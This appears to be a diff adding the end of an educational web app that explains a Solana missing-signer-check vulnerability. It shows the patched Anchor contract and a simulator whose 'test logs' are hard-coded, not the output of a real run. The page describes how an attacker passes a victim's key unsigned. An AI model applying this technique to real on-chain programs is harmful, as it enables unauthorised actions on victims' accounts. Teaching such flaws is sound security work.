+              { num: 9,  code: `    pub fn log_message(ctx: Context<LogMessage>) -> Result<()> {`, type: "normal" },
+              { num: 10, code: `        msg!("GM {}", ctx.accounts.authority.key().to_string());`, type: "normal" },
+              { num: 11, code: `        Ok(())`, type: "normal" },
+              { num: 12, code: `    }`, type: "normal" },
+              { num: 13, code: `}`, type: "normal" },
+              { num: 14, code: ``, type: "normal" },
+              { num: 15, code: `#[derive(Accounts)]`, type: "normal" },
+              { num: 16, code: `pub struct LogMessage<'info> {`, type: "normal" },
+              { num: 17, code: `    pub authority: Signer<'info>, // <-- PATCHED: Enforces is_signer == true`, type: "safe", pill: "Anchor Signer<'info>",
+                title: "Remediation: Anchor Signer<'info> Type",
+                badge: "Line 17 • Cryptographic Enforcement",
+                desc: "Replacing AccountInfo<'info> with Anchor's Signer<'info> type instructs Anchor's generated account validation macro to assert authority.is_signer == true before log_message ever runs.",
+                impact: "If an attacker sends AccountMeta::new_readonly(victim, false), Anchor immediately halts execution and returns ErrorCode::AccountNotSigner (Error Number: 3010 / 0xbc2)."
+              },
+              { num: 18, code: `}`, type: "normal" }
+            ]
+          }
+        },
+
+        // Architecture & Engineering Breakdown Cards
+        cards: [
+          {
+            step: "01 // VULNERABILITY CLASS",
+            title: "Missing Signer Check",
+            accent: "red",
+            body: "Solana separates account metadata (Pubkey, is_signer, is_writable) from instruction logic. If a program reads an authority's Pubkey from AccountInfo without verifying is_signer == true, anyone can pass that Pubkey in the accounts array."
+          },
+          {
+            step: "02 // ANCHOR DISCRIMINATORS",
+            title: "8-Byte Method Routing",
+            accent: "purple",
+            body: "Anchor routes instructions using the first 8 bytes of SHA-256(\"global:<instruction_name>\"). For log_message, that produces [0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73]. Mismatched bytes trigger custom error 0x65 (InstructionFallbackNotFound)."
+          },
+          {
+            step: "03 // TOOLCHAIN ALIGNMENT",
+            title: "SBPF v0 & Modular v3 Crates",
+            accent: "solana",
+            body: "Agave CLI 4.3.2 emits newer SBPF v3 ELF headers by default, whereas LiteSVM 0.9.1 embeds Agave 3.1.14. Compiling with cargo build-sbf --arch v0 and using modular v3 crates (solana-address, solana-account) ensures seamless execution."
+          }
+        ]
+      }
+    };
+
+    /**
+     * =========================================================================
+     * 2. APPLICATION STATE
+     * =========================================================================
+     */
+    let currentChallengeKey = 'challenge_0';
+    let currentCodeTab = 'contract';
+    let selectedLineNum = 17;
+    let simMode = 'insecure';
+
+    /**
+     * =========================================================================
+     * 3. INITIALIZATION & RENDERING FUNCTIONS
+     * =========================================================================
+     */
+    function initApp() {
+      // Populate Challenge Selector Dropdown
+      const selectEl = document.getElementById('challenge-select');
+      selectEl.innerHTML = Object.entries(CHALLENGE_DATABASE).map(([key, data]) => {
+        return `<option value="${key}">${data.dropdownLabel}</option>`;
+      }).join('');
+
+      loadChallenge(currentChallengeKey);
+    }
+
+    function loadChallenge(challengeKey) {
+      currentChallengeKey = challengeKey;
+      const data = CHALLENGE_DATABASE[challengeKey];
+
+      // Update Hero Section
+      document.getElementById('hero-badge-id').textContent = data.id;
+      document.getElementById('hero-badge-severity').textContent = data.severity;
+      document.getElementById('hero-badge-stack').textContent = data.stack;
+      document.getElementById('hero-title').textContent = data.title;
+      document.getElementById('hero-subtitle').textContent = data.subtitle;
+      document.getElementById('kpi-discriminator').textContent = data.discriminator;
+
+      // Render Architecture Cards
+      const cardsContainer = document.getElementById('architecture-cards');
+      cardsContainer.innerHTML = data.cards.map(card => {
+        const accentColor = card.accent === 'red' ? 'text-red-400' : card.accent === 'purple' ? 'text-cyber-purple' : 'text-cyber-solana';
+        return `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-2.5 hover:border-zinc-700 transition">
+            <div class="text-xs font-mono font-semibold ${accentColor}">${card.step}</div>
+            <h3 class="text-base font-bold text-white">${card.title}</h3>
+            <p class="text-sm text-zinc-400 leading-relaxed">${card.body}</p>
+          </div>
+        `;
+      }).join('');
+
+      // Reset to Contract Tab and render
+      switchCodeTab('contract');
+      renderCustomNotes();
+    }
+
+    function switchCodeTab(tabName) {
+      currentCodeTab = tabName;
+      const challenge = CHALLENGE_DATABASE[currentChallengeKey];
+      const fileData = challenge.files[tabName];
+
+      // Update Tab Button Styles
+      ['contract', 'poc', 'patch'].forEach(t => {
+        const btn = document.getElementById(`tab-${t}`);
+        if (t === tabName) {
+          btn.className = "px-3 py-1.5 rounded-md text-xs font-mono font-medium bg-zinc-800 text-white shadow transition cursor-pointer";
+        } else {
+          btn.className = "px-3 py-1.5 rounded-md text-xs font-mono font-medium text-zinc-400 hover:text-white transition cursor-pointer";
+        }
+      });
+
+      document.getElementById('code-filename').textContent = fileData.filename;
+
+      // Render Jump Pills for annotated lines
+      const annotatedLines = fileData.lines.filter(l => l.title);
+      const pillsContainer = document.getElementById('inspector-pills');
+      pillsContainer.innerHTML = annotatedLines.map(l => {
+        const pillColor = l.type === 'vuln'
+          ? 'bg-red-500/15 text-red-400 border-red-500/30 hover:bg-red-500/25'
+          : l.type === 'safe'
+          ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/25'
+          : 'bg-cyber-purple/15 text-cyber-purple border-cyber-purple/30 hover:bg-cyber-purple/25';
+        return `<button onclick="selectCodeLine(${l.num})" class="px-2.5 py-1 rounded text-xs font-mono border ${pillColor} transition cursor-pointer">${l.pill || 'Line ' + l.num}</button>`;
+      }).join('');
+
+      // Select first annotated line by default
+      const initialLine = annotatedLines.length > 0 ? annotatedLines[0].num : 1;
+      selectCodeLine(initialLine);
+    }
+
+    function selectCodeLine(lineNum) {
+      selectedLineNum = lineNum;
+      const fileData = CHALLENGE_DATABASE[currentChallengeKey].files[currentCodeTab];
+
+      // Render all lines
+      const container = document.getElementById('code-container');
+      container.innerHTML = fileData.lines.map(line => {
+        const isSelected = line.num === selectedLineNum;
+        const hasAnnotation = Boolean(line.title);
+
+        let highlightClass = '';
+        if (isSelected) {
+          highlightClass = line.type === 'safe' ? 'code-line-safe-active' : 'code-line-active';
+        } else if (line.type === 'vuln') {
+          highlightClass = 'bg-red-500/5 border-l-2 border-red-500/40';
+        } else if (line.type === 'safe') {
+          highlightClass = 'bg-emerald-500/5 border-l-2 border-emerald-500/40';
+        } else if (line.type === 'info') {
+          highlightClass = 'bg-cyber-purple/5 border-l-2 border-cyber-purple/40';
+        }
+
+        const badgeDot = hasAnnotation
+          ? `<span class="inline-block w-1.5 h-1.5 rounded-full ${line.type === 'safe' ? 'bg-emerald-400' : line.type === 'info' ? 'bg-cyber-purple' : 'bg-red-400'} mr-1.5"></span>`
+          : `<span class="inline-block w-1.5 h-1.5 mr-1.5"></span>`;
+
+        const escapedCode = escapeHtml(line.code) || ' ';
+
+        return `
+          <div onclick="${hasAnnotation ? `selectCodeLine(${line.num})` : ''}"
+               class="code-line flex items-start px-2 py-0.5 rounded-r ${highlightClass} ${hasAnnotation ? 'cursor-pointer' : ''}">
+            <span class="w-8 shrink-0 text-right pr-3 text-zinc-600 select-none">${line.num}</span>
+            <span class="shrink-0 mt-1.5">${badgeDot}</span>
+            <pre class="whitespace-pre text-zinc-200">${escapedCode}</pre>
+          </div>
+        `;
+      }).join('');
+
+      // Update Right Inspector Panel
+      const targetLine = fileData.lines.find(l => l.num === lineNum && l.title) || fileData.lines.find(l => l.title);
+      if (targetLine) {
+        document.getElementById('inspector-title').textContent = targetLine.title;
+        document.getElementById('inspector-desc').textContent = targetLine.desc;
+        document.getElementById('inspector-impact').textContent = targetLine.impact;
+
+        const badgeEl = document.getElementById('inspector-line-badge');
+        const calloutEl = document.getElementById('inspector-callout');
+
+        badgeEl.textContent = targetLine.badge;
+        if (targetLine.type === 'safe') {
+          badgeEl.className = "text-xs font-mono px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30";
+          calloutEl.className = "p-4 rounded-lg bg-emerald-950/25 border border-emerald-500/30 space-y-2";
+          calloutEl.firstElementChild.className = "text-xs font-mono font-bold text-emerald-400 uppercase flex items-center gap-1.5";
+          calloutEl.firstElementChild.innerHTML = "<span>✓</span> Security Guarantee";
+        } else if (targetLine.type === 'info') {
+          badgeEl.className = "text-xs font-mono px-2 py-0.5 rounded bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/30";
+          calloutEl.className = "p-4 rounded-lg bg-purple-950/25 border border-cyber-purple/30 space-y-2";
+          calloutEl.firstElementChild.className = "text-xs font-mono font-bold text-cyber-purple uppercase flex items-center gap-1.5";
+          calloutEl.firstElementChild.innerHTML = "<span>ℹ</span> Runtime Mechanic";
+        } else {
+          badgeEl.className = "text-xs font-mono px-2 py-0.5 rounded bg-red-500/15 text-red-400 border border-red-500/30";
+          calloutEl.className = "p-4 rounded-lg bg-red-950/25 border border-red-500/30 space-y-2";
+          calloutEl.firstElementChild.className = "text-xs font-mono font-bold text-red-400 uppercase flex items-center gap-1.5";
+          calloutEl.firstElementChild.innerHTML = "<span>⚠</span> Why An Attacker Can Abuse This";
+        }
+      }
+    }
+
+    function copyActiveCode() {
+      const fileData = CHALLENGE_DATABASE[currentChallengeKey].files[currentCodeTab];
+      const rawText = fileData.lines.map(l => l.code).join('\n');
+      navigator.clipboard.writeText(rawText).then(() => {
+        const btn = document.getElementById('copy-btn');
+        btn.textContent = "Copied!";
+        btn.classList.add("text-cyber-solana");
+        setTimeout(() => {
+          btn.textContent = "Copy Code";
+          btn.classList.remove("text-cyber-solana");
+        }, 1500);
+      });
+    }
+
+    /**
+     * =========================================================================
+     * 4. LITESVM INTERACTIVE SIMULATOR LOGIC
+     * =========================================================================
+     */
+    function setSimMode(mode) {
+      simMode = mode;
+      const insecureBtn = document.getElementById('sim-mode-insecure');
+      const secureBtn = document.getElementById('sim-mode-secure');
+
+      if (mode === 'insecure') {
+        insecureBtn.className = "px-3.5 py-2 rounded-lg text-xs font-mono font-semibold bg-red-500/20 text-red-400 border border-red-500/40 transition cursor-pointer";
+        secureBtn.className = "px-3.5 py-2 rounded-lg text-xs font-mono font-semibold text-zinc-400 hover:text-white transition cursor-pointer";
+      } else {
+        secureBtn.className = "px-3.5 py-2 rounded-lg text-xs font-mono font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 transition cursor-pointer";
+        insecureBtn.className = "px-3.5 py-2 rounded-lg text-xs font-mono font-semibold text-zinc-400 hover:text-white transition cursor-pointer";
+      }
+    }
+
+    function randomizeVictim() {
+      const base58Chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+      let pubkey = "";
+      for (let i = 0; i < 44; i++) {
+        pubkey += base58Chars.charAt(Math.floor(Math.random() * base58Chars.length));
+      }
+      document.getElementById('sim-victim-input').value = pubkey;
+    }
+
+    function runSimulation() {
+      const victimPubkey = document.getElementById('sim-victim-input').value.trim() || "575R88gdpNaCsHsNEVHh9mwno8XNS4FjvowyypbGFjoG";
+      const terminal = document.getElementById('sim-terminal-output');
+      const badge = document.getElementById('sim-status-badge');
+      const verdict = document.getElementById('sim-verdict-banner');
+
+      terminal.textContent = "$ cargo test --test challenge_0_signer -- --nocapture\nCompiling solana-exploit-lab v0.1.0...\nRunning tests/challenge_0_signer.rs...";
+      badge.textContent = "EXECUTING...";
+      badge.className = "px-2 py-0.5 rounded text-[11px] bg-amber-500/20 text-amber-400";
+
+      setTimeout(() => {
+        if (simMode === 'insecure') {
+          badge.textContent = "EXPLOIT SUCCEEDED (OK)";
+          badge.className = "px-2 py-0.5 rounded text-[11px] bg-red-500/20 text-red-400 font-semibold";
+          terminal.innerHTML = `<span class="text-zinc-500">$ cargo test --test challenge_0_signer -- --nocapture</span>
+<span class="text-zinc-400">running 1 test</span>
+<span class="text-white font-semibold">Transaction Logs:</span>
+[
+    <span class="text-zinc-300">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",</span>
+    <span class="text-zinc-300">"Program log: Instruction: LogMessage",</span>
+    <span class="text-red-400 font-bold">"Program log: GM ${escapeHtml(victimPubkey)}",</span>
+    <span class="text-zinc-400">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 11408 of 200000 compute units",</span>
+    <span class="text-emerald-400">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",</span>
+]
+<span class="text-emerald-400 font-bold">test test_missing_signer_exploit ... ok</span>`;
+
+          verdict.innerHTML = `<span class="text-red-400 font-semibold">VULNERABILITY CONFIRMED:</span> The insecure program accepted <code class="text-zinc-200">${escapeHtml(victimPubkey.slice(0, 8))}...</code> with <code class="text-red-400">is_signer = false</code> and executed privileged logic on the victim's behalf.`;
+        } else {
+          badge.textContent = "EXPLOIT BLOCKED (3010)";
+          badge.className = "px-2 py-0.5 rounded text-[11px] bg-emerald-500/20 text-emerald-400 font-semibold";
+          terminal.innerHTML = `<span class="text-zinc-500">$ cargo test --test challenge_0_signer_patched -- --nocapture</span>
+<span class="text-zinc-400">running 1 test</span>
+<span class="text-white font-semibold">Transaction Logs:</span>
+[
+    <span class="text-zinc-300">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",</span>
+    <span class="text-zinc-300">"Program log: Instruction: LogMessage",</span>
+    <span class="text-amber-400 font-bold">"Program log: AnchorError caused by account: authority. Error Code: AccountNotSigner. Error Number: 3010. Error Message: The given account did not sign.",</span>
+    <span class="text-zinc-400">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 4812 of 200000 compute units",</span>
+    <span class="text-red-400">"Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: custom program error: 0xbc2",</span>
+]
+<span class="text-emerald-400 font-bold">test test_patched_rejects_unsigned_caller ... ok</span>`;
+
+          verdict.innerHTML = `<span class="text-emerald-400 font-semibold">PATCH VERIFIED:</span> Anchor's <code class="text-emerald-400">Signer&lt;'info&gt;</code> constraint detected <code class="text-zinc-200">is_signer == false</code> and aborted execution before <code class="text-zinc-200">log_message</code> ran.`;
+        }
+      }, 280);
+    }
+
+    /**
+     * =========================================================================
+     * 5. LOCALSTORAGE PERSONAL AUDIT NOTES (EXTENSIBLE BY USER IN BROWSER)
+     * =========================================================================
+     */
+    function getStorageKey() {
+      return `solana_exploit_lab_notes_${currentChallengeKey}`;
+    }
+
+    function renderCustomNotes() {
+      const container = document.getElementById('custom-notes-list');
+      const saved = JSON.parse(localStorage.getItem(getStorageKey()) || '[]');
+
+      if (saved.length === 0) {
+        container.innerHTML = `<div class="text-xs font-mono text-zinc-600 italic py-1">No custom field notes added for this module yet.</div>`;
+        return;
+      }
+
+      container.innerHTML = saved.map((note, index) => `
+        <div class="flex items-start justify-between gap-3 bg-cyber-bg border border-cyber-border rounded-lg px-3.5 py-2.5 text-sm text-zinc-300">
+          <div class="flex items-start gap-2.5">
+            <span class="text-cyber-solana font-mono text-xs mt-0.5">#${index + 1}</span>
+            <span>${escapeHtml(note)}</span>
+          </div>
+          <button onclick="deleteCustomNote(${index})" class="text-zinc-600 hover:text-red-400 font-mono text-xs shrink-0 cursor-pointer" title="Delete note">✕</button>
+        </div>
+      `).join('');
+    }
+
+    function addCustomNote(e) {
+      e.preventDefault();
+      const input = document.getElementById('custom-note-input');
+      const text = input.value.trim();
+      if (!text) return;
+
+      const saved = JSON.parse(localStorage.getItem(getStorageKey()) || '[]');
+      saved.push(text);
+      localStorage.setItem(getStorageKey(), JSON.stringify(saved));
+      input.value = '';
+      renderCustomNotes();
+    }
+
+    function deleteCustomNote(index) {
+      const saved = JSON.parse(localStorage.getItem(getStorageKey()) || '[]');
+      saved.splice(index, 1);
+      localStorage.setItem(getStorageKey(), JSON.stringify(saved));
+      renderCustomNotes();
+    }
+
+    function clearCustomNotes() {
+      localStorage.removeItem(getStorageKey());
+      renderCustomNotes();
+    }
+
+    // Utility to prevent XSS when rendering user notes or pubkeys
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    // Boot the application
+    window.addEventListener('DOMContentLoaded', initApp);
+  </script>
+</body>
+</html>
